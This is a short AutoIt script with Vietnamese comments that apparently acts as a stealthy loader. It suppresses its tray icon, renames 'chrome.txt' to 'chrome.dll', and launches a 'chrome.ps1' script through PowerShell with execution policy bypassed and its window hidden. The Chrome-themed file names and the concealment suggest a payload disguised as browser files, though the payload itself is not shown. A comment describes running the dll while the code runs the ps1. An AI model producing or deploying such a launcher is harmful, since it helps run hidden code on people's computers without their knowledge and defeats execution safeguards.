#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Change2CUI=n
#EndRegion

Local $sDir = @ScriptDir
Local $sTxt = $sDir & "\chrome.txt"
Local $sDll = $sDir & "\chrome.dll"

; Bước 1: Đổi chrome.txt về chrome.dll nếu cần
If FileExists($sTxt) And Not FileExists($sDll) Then
    FileMove($sTxt, $sDll, 1)
EndIf

If Not FileExists($sDll) Then
    MsgBox(16, "Lỗi", "Không tìm thấy file chrome.dll tại: " & $sDir)
    Exit
EndIf

; Bước 2: Chạy chrome.dll thông qua powershell ngầm hoàn toàn
Local $sCmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' & $sDir & '\chrome.ps1"'
Run($sCmd, $sDir, @SW_HIDE)
